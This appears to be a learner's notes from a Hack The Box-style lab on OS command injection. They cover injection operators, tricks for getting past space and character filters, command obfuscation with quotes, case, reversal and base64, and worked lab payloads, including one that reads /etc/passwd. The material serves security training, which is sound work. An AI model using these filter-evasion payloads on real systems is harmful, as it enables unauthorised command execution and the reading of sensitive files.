

If the user input is not properly sanitized we can leverage the configurations of the server which in this case its allowed to execute commands to append our own commands and achieve OS command execution

for example

a site is executing a ping command if the validation is happening only on the front end then it means we can manipulate that input and try to append our own commands , in this case wit with the usage of the semicolon we were able to escape and append our own command at the end 

![](../../images/Pasted%20image%2020260915120849.png)

We can use this as reference to try various techniques to append our command 


![](../../images/Pasted%20image%2020260915120946.png)

# AND Operator

Here we encoded the and operator and our chained command worked

![](../../images/Pasted%20image%2020260915121357.png)

# OR Operator

> [!IMPORTANT]
> The `OR` operator only executes the second command if the first command fails to execute. This may be useful for us in cases where our injection would break the original command without having a solid way of having both commands work. So, using the `OR` operator would make our new command execute if the first one fails.

If we try to break the first command for instance remove the ip number the OR condition will get executed since the first one failed and will have our command executed

![](../../images/Pasted%20image%2020260915122616.png)


A list below with the most common operators 

![](../../images/Pasted%20image%2020260915123122.png)

Piping it only show the output of our command 

![](../../images/Pasted%20image%2020260915123927.png)

In some cases some characters , spaces or commands might be behind a filter its good to try encoding the spaces or special characters 

![](../../images/Pasted%20image%2020260915130712.png)


# Bypassing spaces

Once we have a working injection operator  for ex `0a whoami`, here we still get an error because there are other filters in place , a space is a commonly blacklisted character especially if the input should not contain spaces...


#### Using Tabs

We successfully bypassed the space filter using a tab

![](../../images/Pasted%20image%2020260915135633.png)

We successfully bypassed the space filter using $IFS

![](../../images/Pasted%20image%2020260915135305.png)

We successfully bypassed the space filter using bash brace expansion
![](../../images/Pasted%20image%2020260915135451.png)

To discover more space filter bypasses, check out the [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space) page on writing commands without spaces

# Bypassing Other Blacklisted Characters

## Linux

Besides injection operators and space characters, a very commonly blacklisted character is the slash (`/`) or backslash (`\`) character, as it is necessary to specify directories in Linux or Windows.

We can use environment variables like we did with ${IFS} , IFS only replaces spaces , a way to produce slashes and semicolons is by specifying a **start** and **length** of our string to exactly match this character , for example

![](../../images/Pasted%20image%2020260915141352.png)

if we start at the 0 character only take a string of length 1 , we will end up with only the / character which we can then use to our payload

> [!NOTE]
> When we use the above command in our payload, we will not add `echo`, as we are only using it in this case to show the outputted character.

We can do the same with the `$HOME` or `$PWD` environment variables as well.We can also use the same concept to get a semi-colon character, to be used as an injection operator. For example, the following command gives us a semi-colon:

```
echo ${LS_COLORS:10:1}

;
```

> [!NOTE]
> The `printenv` command prints all environment variables in Linux, so you can look which ones may contain useful characters, and then try to reduce the string to that character only.

From the printenv command , we found that **COLORFGBG=15;0**  has a semicolon which we can use , so by doing 

![](../../images/Pasted%20image%2020260915142629.png)

here our starting poiont will be 2 and our length will be 1 as we only need one character so the final result will be 

![](../../images/Pasted%20image%2020260915142715.png)

so `echo ${COLORFGBG:2:1}` produces a semicolon

`127.0.0.1$${COLORFGBG:2:1}${IFS}`
here we have 127.0.0.1; followed by a space 


## Windows

The same concept works on Windows as well. For example, to produce a slash in `Windows Command Line (CMD)`, we can `echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (`~6` -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`

```
echo %HOMEPATH:~6,-11%

\
```


We can achieve the same thing using the same variables in `Windows PowerShell`. With PowerShell, a word is considered an array, so we have to specify the index of the character we need. As we only need one character, we don't have to specify the start and end positions

```
$env:HOMEPATH[0]

\
```


```
$env:PROGRAMFILES[10]
```


We can also use the `Get-ChildItem Env:` PowerShell command to print all environment variables and then pick one of them to produce a character we need.

## Character Shifting

There are other techniques to produce the required characters without using them, like `shifting characters`. For example, the following Linux command shifts the character we pass by `1`. So, all we have to do is find the character in the ASCII table that is just before our needed character (we can get it with `man ascii`), then add it instead of `[` in the below example. This way, the last printed character would be the one we need:

```
man ascii     # \ is on 92, before it is [ on 91
dominuc07@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

the math works by pushing every character up one possition so if we want to produce the semicolon here 

![](../../images/Pasted%20image%2020260915145248.png)

we need to go back one possition , so the previous character before the ; is the : so the command should follow as 

 `echo $(tr '!-}' '"-~' <<< :)`

`;`


here we replaced the [  with the : as it was the previous character on the ASCII table


## LAB

here we combined various techniques we found a working injection was the encoded version of new-line followed by space ls /home and we were able to find the username 



![](../../images/Pasted%20image%2020260915152650.png)

# Bypassing Blacklisted Commands


### Linux & Windows

The easiest to use are quotes, and they work on both Linux and Windows servers. For example, if we want to obfuscate the `whoami` command, we can insert single quotes between its characters, as follows:

```
 w'h'o'am'i
```

```
w"h"o"am"i
```

![](../../images/Pasted%20image%2020260915153812.png)


> [!NOTE]
> The important things to remember are that `we cannot mix types of quotes` and `the number of quotes must be even`. We can try one of the above in our payload (`127.0.0.1%0aw'h'o'am'i`) and see if it works:

## Linux Only

```
who$@ami
w\ho\am\i
```


## Windows Only

There are also some Windows-only characters we can insert in the middle of commands that do not affect the outcome, like a caret (`^`) character, as we can see in the following example:

```
who^ami
```


LAB , in this like we will try to find the flag in the previous username 

![](../../images/Pasted%20image%2020260915154609.png)

essentially this is the command we try to inject and it translates to 

![](../../images/Pasted%20image%2020260915154657.png)

`ip=127.0.0.1%0ac'a't${IFS}${PWD:0:1}home${PWD:0:1}1nj3c70r${PWD:0:1}flag.txt`

here the command cat was filtered so we bypassed it by obfuscating it with '' 

# Advanced Command Obfuscation


In some instances, we may be dealing with advanced filtering solutions, like Web Application Firewalls (WAFs), and basic evasion techniques may not necessarily work. We can utilize more advanced techniques for such occasions, which make detecting the injected commands much less likely.


One command obfuscation technique we can use is case manipulation, like inverting the character cases of a command (e.g. WHOAMI) or alternating between cases (e.g. WhOaMi). This usually works because a command blacklist may not check for different case variations of a single word, as Linux systems are case-sensitive.

If we are dealing with a Windows server, we can change the casing of the characters of the command and send it. In Windows, commands for PowerShell and CMD are case-insensitive, meaning they will execute the command regardless of what case it is written in

```
WhOaMi
```



On the other hand linux and bash is more case sensitive , we can try 

```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

tr here replaced all uper-case charachters with lower -case characters . which results in all lower-case character command.  This command tho might still fail if the application filters spaces or any other filtered characthers, if we replace the spaces with tabs `%09` the command executes perfectly! 

![](../../images/Pasted%20image%2020260915155413.png)

On other way is to reverse the word for ex

```
echo 'whoami' | rev
```

then we can execute the command by reversing it back in a sub-shell (`$()`) 

```
$(rev<<<'imaohw')
```

> [!NOTE]
> Tip: If you wanted to bypass a character filter with the above method, you'd have to reverse them as well, or include them when reversing the original command.

Same thing can apply in **Windows** 

```
"whoami"[-1..-20] -join ''
```


We can now use the below command to execute a reversed string with a PowerShell sub-shell (`iex "$()"`), as follows

```
iex "$('imaohw'[-1..-20] -join '')"
```

## Encoded Commands

We can utilize various encoding tools, like `base64` (for b64 encoding) or `xxd` (for hex encoding).

```
echo -n 'cat /etc/passwd | grep 33' | base64
```

this is good because the filtered characters get encoded with base64, we will then create a command that will decode the encoded string in a sub-shell $() and then pass it to bash to be executed. 

```
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```


![](../../images/Pasted%20image%2020260915160310.png)

> [!NOTE]
> Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

![](../../images/Pasted%20image%2020260915160349.png)


## LAB3

![](../../images/Pasted%20image%2020260915190508.png)

in this lab we base64 encoded the entire command with the restricted charachters in it we also used <<< because | pas restricted , in this example bash was not restricted but if it was this could have also worked 

![](../../images/Pasted%20image%2020260915190724.png)

b$()ash also we covered the space using tabs 


# Linux (Bashfuscator)

A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:

![](../../images/Pasted%20image%2020260916091646.png)

we can start using it from the `./bashfuscator/bin/` directory.

![](../../images/Pasted%20image%2020260916091725.png)



## Windows (DOSfuscation)

![](../../images/Pasted%20image%2020260916091804.png)


Final Assesement 


Here spaces were filtered as well as command , I first tried to find my injector `%26` worked here , the command cat was also filtered so i had to obfuscate it to c$()at  c'a't also worked pretty well then did l's and saw i was in the root directory , so then i constructed my command as following 

GET /index.php?to=tmp%26c'a't${IFS}${PWD:0:1}flag.txt&from=2380029473.txt&finish=1&move=1

![](../../images/Pasted%20image%2020260916120418.png)


other way is to encode the entire command to a base64 string to bypass filters tap the spaces with %09 


%26bash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dAo=)**&from=2470930823.txt**